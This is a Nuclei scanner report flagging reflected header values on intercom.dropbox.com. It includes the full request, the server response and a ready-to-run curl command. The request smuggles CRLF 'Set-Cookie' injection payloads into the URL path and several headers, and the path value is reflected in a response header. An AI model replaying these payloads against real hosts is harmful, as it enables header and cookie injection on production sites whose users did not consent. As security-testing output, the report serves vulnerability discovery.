### Looking for reflected values from request headers (header-reflection) found on https://intercom.dropbox.com

----
**Details**: **header-reflection** matched at https://intercom.dropbox.com

**Protocol**: HTTP

**Full URL**: https://intercom.dropbox.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.intercom.dropbox.com

**Timestamp**: Sat Dec 9 14:38:59 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Looking for reflected values from request headers |
| Authors | panch0r3d |
| Tags |  |
| Severity | high |

**Request**
```http
GET /%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.intercom.dropbox.com HTTP/1.1
Host: intercom.dropbox.com
User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly
Connection: close
Accept: */*
Accept-Language: en
Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly
Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly
X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly
x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 404 Not Found
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html
Date: Sat, 09 Dec 2023 14:38:58 GMT
Etag: W/"f396a88cb15cc813accecbd72e97ea01"
Last-Modified: Tue, 13 Mar 2018 22:32:35 GMT
Server: AmazonS3
Vary: Accept-Encoding
Via: 1.1 cf04af0068b2a5085b05bea6fffb0856.cloudfront.net (CloudFront)
X-Amz-Cf-Id: h-VcmfaaDjOQz-_dX17uJ7TSIgGR-jCZB-r06Kh72hMx8-s7V-yxgw==
X-Amz-Cf-Pop: CDG50-C1
X-Amz-Error-Code: NoSuchKey
X-Amz-Error-Detail-Key: %0d%0aset-cookie :mycookie=Canary12345; Domain =.intercom.dropbox.com
X-Amz-Error-Message: The specified key does not exist.
X-Cache: Error from cloudfront

<html>
  <head>
    <title>Dropbox Intercom Chats</title>
  </head>
  <body style="background-color: transparent">
    <script type="text/javascript">
      (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',intercomSettings);}else{var d=document;var i=function(){i.c(arguments)};i.q=[];i.c=function(args){i.q.push(args)};w.Intercom=i;function l(){var s=d.createElement('script');s.type='text/javascript';s.async=true;
      s.src='https://widget.intercom.io/widget/gg8uf5il';
      var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);}if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})()
    </script>
    <script type="text/javascript">
      (function() {
        var TARGET_URL = "https://www.dropbox.com";
        var APP_ID = "gg8uf5il";

        // This does not trigger by default when a new message is received; see onUnreadCountChange
        Intercom('onShow', function() {
          sendMessage('show');
        });

        // When visitor hides the chat, also hide the iframe and end the chat
        Intercom('onHide', function() {
          sendMessage('hide');
        });

        // When visitor receives a message, show the chat
        Intercom('onUnreadCountChange', function() {
          Intercom('show');
        });

        function getTargetURL() {
          return TARGET_URL;
        }

        function validOriginURL(url) {
          return url === getTargetURL();
        }

        function createIntercomScript(chatData) {
          var intercomSettings = {
            app_id: APP_ID,
          };
          for (var prop in chatData) {
            if (chatData.hasOwnProperty(prop)) {
              intercomSettings[prop] = chatData[prop];
            }
          }
          Intercom('boot', intercomSettings);
        }

        function startReactiveChat() {
          Intercom('showNewMessage');
        }

        function updateIntercomSettings(chatData) {
          Intercom('update', chatData);
        }

        function receiveMessage(event) {
          if (!validOriginURL(event.origin)) {
            return;
          }

          var data = event.data;
          switch (data.message_type) {
            case "createIntercomScript":
              createIntercomScript(data.chatData);
              break;

            case "showChat":
              Intercom('show');
              break;

            case "startChat":
              startReactiveChat();
              break;

            case "updateIntercomSettings":
              updateIntercomSettings(data.chatData);
              break;
          }
        }

        function sendMessage(message_type, data = {}) {
          data.message_type = message_type;
          parent.postMessage(data, getTargetURL());
        }

        window.addEventListener('message', receiveMessage, false);
      })();
    </script>
  </body>
</html>

```

**Extra Information**

**Extracted results:**

- X-Amz-Error-Detail-Key: %0d%0aset-cookie :mycookie=Canary12345; Domain =.intercom.dropbox.com



**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly' -H 'Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' -H 'Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly' -H 'User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly' -H 'X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly' -H 'x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' 'https://intercom.dropbox.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.intercom.dropbox.com'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)